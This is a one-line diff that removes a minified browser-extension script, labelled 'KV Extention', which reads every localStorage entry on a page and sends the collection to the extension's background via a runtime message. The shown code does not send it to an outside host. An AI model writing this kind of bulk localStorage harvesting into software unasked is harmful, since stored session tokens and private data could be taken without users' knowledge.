@@ -1,1 +1,0 @@
-(()=>{console.log("KV Extention running");for(var e={},o=0;o<localStorage.length;o++){var a=localStorage.key(o),t=localStorage.getItem(a);e[a]=t}chrome.runtime.sendMessage({action:"sendLocalStorage",data:e})})();
